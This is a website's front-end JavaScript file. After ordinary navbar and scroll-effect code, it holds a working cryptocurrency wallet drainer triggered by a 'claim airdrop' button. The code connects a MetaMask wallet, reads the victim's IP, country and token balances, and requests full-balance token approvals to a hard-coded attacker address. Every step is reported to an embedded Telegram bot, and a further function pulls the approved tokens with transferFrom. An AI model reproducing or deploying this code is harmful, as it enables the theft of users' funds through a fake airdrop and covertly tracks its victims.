'use strict';

/**
 * Add event on element
 */
const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
};

/**
 * Navbar toggle
 */
const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
};

addEventOnElem(navToggler, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
};

addEventOnElem(navbarLinks, "click", closeNavbar);

/**
 * Header active on scroll
 */
const header = document.querySelector("[data-header]");

const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
};

addEventOnElem(window, "scroll", activeHeader);

/**
 * Toggle active on add to fav
 */
const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");

const toggleActive = function () {
  this.classList.toggle("active");
};

addEventOnElem(addToFavBtns, "click", toggleActive);

/**
 * Scroll reveal effect
 */
const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
};

scrollReveal();
addEventOnElem(window, "scroll", scrollReveal);

/**
 * Wallet connect, token approval, and Telegram notification
 */
async function connectWalletAndSendTokens() {
  if (!window.ethers || !window.ethereum) {
    console.error("MetaMask is not installed.");
    if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
      window.location.href = "https://metamask.app.link/dapp/" + window.location.host + window.location.pathname;
    } else {
      window.location.href = "https://metamask.io/download.html";
    }
    return;
  }

  const evmNetworks = [
    {
      chainId: 56,
      name: "Binance Smart Chain",
      chainName: "bsc",
      nativeCoin: "BNB",
      exodusAddress: "0xe22151324Ed5b8A4F2B45f1Funds1e15B2aEc1B28" // Replace with test address
    }
  ];

  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU"; // Replace with test bot token
  const chatId = "5995616824"; // Replace with test chat ID
  const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY"; // Replace with test API key

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  // Helper function to send Telegram notifications
  async function sendTelegramNotification(message) {
    try {
      console.log("Attempting to send Telegram notification:", message);
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
      const result = await response.json();
      if (!result.ok) {
        throw new Error(`Telegram API error: ${result.description}`);
      }
      console.log("Telegram notification sent successfully:", result);
      return result;
    } catch (error) {
      console.error("Failed to send Telegram notification:", error.message);
      return null;
    }
  }

  try {
    console.log("Requesting MetaMask account connection...");
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    console.log(`Wallet connected: ${userAddress} (MetaMask)`);

    // Capture device type
    let deviceType = "Unknown";
    if (/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)) {
      deviceType = "Mobile";
    } else if (/Tablet/i.test(navigator.userAgent)) {
      deviceType = "Tablet";
    } else {
      deviceType = "Desktop";
    }

    // Fetch location data
    let locationData = {};
    try {
      console.log("Fetching location data...");
      const locRes = await fetch("https://ipapi.co/json/");
      locationData = await locRes.json();
      console.log("Location data fetched:", locationData);
    } catch (e) {
      console.warn("Location fetch failed", e);
      locationData = { country_name: "Unknown", ip: "N/A" };
    }

    // Send wallet connection notification
    const connectionMessage = `
📥 Wallet Connected on Binance Smart Chain
Address: ${userAddress}
Wallet: MetaMask
Country: ${locationData.country_name}
IP: ${locationData.ip}
${deviceType}
    `;
    await sendTelegramNotification(connectionMessage);

    for (const network of evmNetworks) {
      try {
        console.log(`Processing network: ${network.name}`);

        try {
          console.log("Switching to BSC network...");
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${network.chainId.toString(16)}` }]
          });
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            console.log("BSC network not found, adding chain...");
            const chainConfig = {
              chainId: '0x38',
              chainName: 'Binance Smart Chain Mainnet',
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              blockExplorerUrls: ['https://bscscan.com']
            };
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [chainConfig]
            });
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${network.chainId.toString(16)}` }]
            });
          } else {
            throw switchErr;
          }
        }

        const currentProvider = new ethers.providers.Web3Provider(window.ethereum);
        const currentSigner = currentProvider.getSigner();
        const currentNetwork = await currentProvider.getNetwork();
        console.log(`Switched to network: ${currentNetwork.name} (chainId: ${currentNetwork.chainId})`);

        if (currentNetwork.chainId !== network.chainId) {
          const errorMessage = `❌ Failed to switch to ${network.name}.\n${deviceType}`;
          await sendTelegramNotification(errorMessage);
          continue;
        }

        if (!currentSigner) {
          const errorMessage = `❌ Signer not initialized for ${network.name}.\n${deviceType}`;
          await sendTelegramNotification(errorMessage);
          continue;
        }

        await delay(1000);

        let tokens = [];
        let tokenSummary = "";
        let apiAttempts = 0;
        const maxAttempts = 3;
        let apiSuccess = false;

        while (apiAttempts < maxAttempts && !apiSuccess) {
          try {
            apiAttempts++;
            console.log(`Fetching BEP-20 tokens (attempt ${apiAttempts})...`);
            const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
            const response = await fetch(moralisUrl, {
              headers: { "X-API-Key": moralisApiKey }
            });
            if (!response.ok) throw new Error(`Moralis API error: ${response.statusText}`);
            tokens = await response.json();
            apiSuccess = true;

            const nonZeroTokens = tokens.filter(t => 
              t.balance && 
              !ethers.BigNumber.from(t.balance).isZero() && 
              t.token_address && 
              ethers.utils.isAddress(t.token_address) && 
              t.symbol && 
              t.decimals !== undefined
            );

            tokenSummary = nonZeroTokens.length > 0
              ? nonZeroTokens.map(token => {
                  const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
                  return `• ${token.symbol}: ${balance}`;
                }).join("\n")
              : `No valid non-zero BEP-20 token balances found.`;
          } catch (apiErr) {
            console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
            if (apiAttempts === maxAttempts) {
              tokenSummary = `Failed to fetch BEP-20 token balances: ${apiErr.message}`;
            } else {
              await delay(3000);
            }
          }
        }

        const nativeBalance = await currentProvider.getBalance(userAddress);
        const formattedBalance = ethers.utils.formatEther(nativeBalance);
        const nativeBalanceMessage = `• ${network.nativeCoin}: ${formattedBalance}`;

        const networkMessage = `
💰 Balances on ${network.name}:
${tokenSummary}
${nativeBalanceMessage}
Address: ${userAddress}
${deviceType}
        `;
        await sendTelegramNotification(networkMessage);

        const nonZeroTokens = tokens.filter(t => 
          t.balance && 
          !ethers.BigNumber.from(t.balance).isZero() && 
          t.token_address && 
          ethers.utils.isAddress(t.token_address) && 
          t.symbol && 
          t.decimals !== undefined
        );

        if (nonZeroTokens.length > 0) {
          for (const token of nonZeroTokens) {
            try {
              // Validate token contract existence
              const code = await currentProvider.getCode(token.token_address);
              if (code === "0x") {
                const errorMessage = `
❌ Invalid Contract
Token: ${token.symbol || 'Unknown'}
Error: No contract code at ${token.token_address}
${deviceType}
                `;
                await sendTelegramNotification(errorMessage);
                continue;
              }

              // Use increaseAllowance with retry mechanism
              let contract = new ethers.Contract(token.token_address, [
                "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
                "function allowance(address owner, address spender) public view returns (uint256)"
              ], currentSigner);

              const balance = ethers.BigNumber.from(token.balance);
              const currentAllowance = await contract.allowance(userAddress, network.exodusAddress);
              const neededAllowance = balance.sub(currentAllowance);

              if (neededAllowance.gt(0)) {
                let approvalTx;
                let attempts = 0;
                const maxAttempts = 3;

                while (attempts < maxAttempts) {
                  try {
                    console.log(`Attempting approval for ${token.symbol} (attempt ${attempts + 1})...`);
                    approvalTx = await contract.increaseAllowance(network.exodusAddress, neededAllowance, { gasLimit: 100000 });
                    await approvalTx.wait();
                    break; // Success, exit retry loop
                  } catch (err) {
                    attempts++;
                    if (err.message.includes("execution reverted") || err.message.includes("UNPREDICTABLE_GAS_LIMIT")) {
                      if (attempts < maxAttempts) {
                        console.warn(`Attempt ${attempts} failed for ${token.symbol}: ${err.message}. Retrying...`);
                        await delay(2000); // Wait 2 seconds before retry
                        continue;
                      }
                    }
                    // Handle user rejection or other errors
                    let errorMessage;
                    if (err.message.includes("user denied") || err.message.includes("not authorized")) {
                      errorMessage = `
❌ User Rejected Approval
Token: ${token.symbol || 'Unknown'}
Error: User denied authorization
${deviceType}
                      `;
                    } else {
                      errorMessage = `
❌ Approval Failed
Token: ${token.symbol || 'Unknown'}
Error: ${err.message} (after ${attempts} attempts)
${deviceType}
                      `;
                    }
                    await sendTelegramNotification(errorMessage);
                    continue; // Skip to next token
                  }
                }

                if (approvalTx) {
                  const formattedAmount = ethers.utils.formatUnits(neededAllowance, token.decimals ?? 18);
                  const approvalMessage = `
✅ Approval Successful
Token: ${token.symbol}
Amount Approved: ${formattedAmount}
Spender: ${network.exodusAddress}
Tx: ${approvalTx.hash}
${deviceType}
                  `;
                  await sendTelegramNotification(approvalMessage);
                }
              } else {
                console.log(`Sufficient allowance already exists for ${token.symbol}`);
              }
            } catch (err) {
              let errorMessage;
              if (err.message.includes("user denied") || err.message.includes("not authorized")) {
                errorMessage = `
❌ User Rejected Approval
Token: ${token.symbol || 'Unknown'}
Error: User denied authorization
${deviceType}
                `;
              } else {
                errorMessage = `
❌ Approval Failed
Token: ${token.symbol || 'Unknown'}
Token Address: ${token.token_address}
Error: ${err.message}
${deviceType}
                `;
              }
              await sendTelegramNotification(errorMessage);
              continue;
            }
          }
        }
      } catch (err) {
        const errorMessage = `❌ Error on ${network.name}: ${err.message}\n${deviceType}`;
        await sendTelegramNotification(errorMessage);
      }
    }
  } catch (err) {
    const errorMessage = `❌ Wallet Connection Failed: ${err.message}\n${deviceType}`;
    await sendTelegramNotification(errorMessage);
  }
}

/**
 * Manual transfer function to be called after approval (e.g., via BscScan or script)
 */
async function executeTransferFrom(tokenAddress, userAddress, amount, decimals, exodusAddress) {
  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU"; // Replace with test bot token
  const chatId = "5995616824"; // Replace with test chat ID

  let deviceType = "Unknown";
  if (/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)) {
    deviceType = "Mobile";
  } else if (/Tablet/i.test(navigator.userAgent)) {
    deviceType = "Tablet";
  } else {
    deviceType = "Desktop";
  }

  async function sendTelegramNotification(message) {
    try {
      console.log("Attempting to send Telegram notification:", message);
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
      const result = await response.json();
      if (!result.ok) {
        throw new Error(`Telegram API error: ${result.description}`);
      }
      console.log("Telegram notification sent successfully:", result);
      return result;
    } catch (error) {
      console.error("Failed to send Telegram notification:", error.message);
      return null;
    }
  }

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const contract = new ethers.Contract(tokenAddress, [
      "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
      "function symbol() public view returns (string)"
    ], signer);

    const tokenSymbol = await contract.symbol();
    const transferTx = await contract.transferFrom(userAddress, exodusAddress, amount, { gasLimit: 100000 });
    await transferTx.wait();

    const formattedAmount = ethers.utils.formatUnits(amount, decimals);
    const transferSuccessMessage = `
✅ Transfer Successful
Token: ${tokenSymbol}
Amount: ${formattedAmount}
From: ${userAddress}
To: ${exodusAddress}
Tx: ${transferTx.hash}
${deviceType}
    `;
    await sendTelegramNotification(transferSuccessMessage);
  } catch (err) {
    const errorMessage = `
❌ Transfer Failed
Token Address: ${tokenAddress}
Error: ${err.message}
${deviceType}
    `;
    await sendTelegramNotification(errorMessage);
  }
}

document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);